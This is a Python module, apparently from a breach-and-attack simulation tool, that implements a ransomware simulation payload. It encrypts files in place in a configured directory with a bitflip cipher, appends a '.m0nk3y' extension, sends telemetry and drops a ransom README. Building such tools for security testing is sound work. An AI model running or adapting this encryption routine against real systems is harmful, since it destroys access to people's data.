import logging
import shutil
from pathlib import Path
from typing import List, Optional, Tuple

from infection_monkey.ransomware.bitflip_encryptor import BitflipEncryptor
from infection_monkey.ransomware.file_selectors import select_production_safe_target_files
from infection_monkey.ransomware.valid_file_extensions import VALID_FILE_EXTENSIONS_FOR_ENCRYPTION
from infection_monkey.telemetry.file_encryption_telem import FileEncryptionTelem
from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

EXTENSION = ".m0nk3y"
CHUNK_SIZE = 4096 * 24

README_SRC = Path(__file__).parent / "ransomware_readme.txt"
README_DEST = "README.txt"


class RansomwarePayload:
    def __init__(self, config: dict, telemetry_messenger: ITelemetryMessenger):
        self.should_encrypt = config["encryption"]["should_encrypt"]
        LOG.info(f"Encryption routine for ransomware simulation enabled: {self.should_encrypt}")

        target_directories = config["encryption"]["directories"]
        LOG.info(
            f"Windows dir configured for encryption is \"{target_directories['windows_dir']}\""
        )
        LOG.info(f"Linux dir configured for encryption is \"{target_directories['linux_dir']}\"")

        self._target_dir = (
            target_directories["windows_dir"]
            if is_windows_os()
            else target_directories["linux_dir"]
        )

        self._readme_enabled = config["other_behaviors"]["readme"]
        LOG.info(f"README enabled: {self._readme_enabled}")

        self._new_file_extension = EXTENSION
        self._valid_file_extensions_for_encryption = VALID_FILE_EXTENSIONS_FOR_ENCRYPTION.copy()
        self._valid_file_extensions_for_encryption.discard(self._new_file_extension)

        self._encryptor = BitflipEncryptor(chunk_size=CHUNK_SIZE)
        self._telemetry_messenger = telemetry_messenger

    def run_payload(self):
        if self.should_encrypt:
            LOG.info("Running ransomware payload")
            file_list = self._find_files()
            self._encrypt_files(file_list)

        self._leave_readme()

    def _find_files(self) -> List[Path]:
        if not self._target_dir:
            return []

        return select_production_safe_target_files(
            Path(self._target_dir), self._valid_file_extensions_for_encryption
        )

    def _encrypt_files(self, file_list: List[Path]) -> List[Tuple[Path, Optional[Exception]]]:
        results = []
        for filepath in file_list:
            try:
                LOG.debug(f"Encrypting {filepath}")
                self._encryptor.encrypt_file_in_place(filepath)
                self._add_extension(filepath)
                self._send_telemetry(filepath, True, "")
            except Exception as ex:
                LOG.warning(f"Error encrypting {filepath}: {ex}")
                self._send_telemetry(filepath, False, str(ex))

        return results

    def _add_extension(self, filepath: Path):
        new_filepath = filepath.with_suffix(f"{filepath.suffix}{self._new_file_extension}")
        filepath.rename(new_filepath)

    def _send_telemetry(self, filepath: Path, success: bool, error: str):
        encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
        self._telemetry_messenger.send_telemetry(encryption_attempt)

    def _leave_readme(self):
        if self._readme_enabled:
            readme_dest_path = Path(self._target_dir) / README_DEST
            LOG.info(f"Leaving a ransomware README file at {readme_dest_path}")

            try:
                shutil.copyfile(README_SRC, readme_dest_path)
            except Exception as ex:
                LOG.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
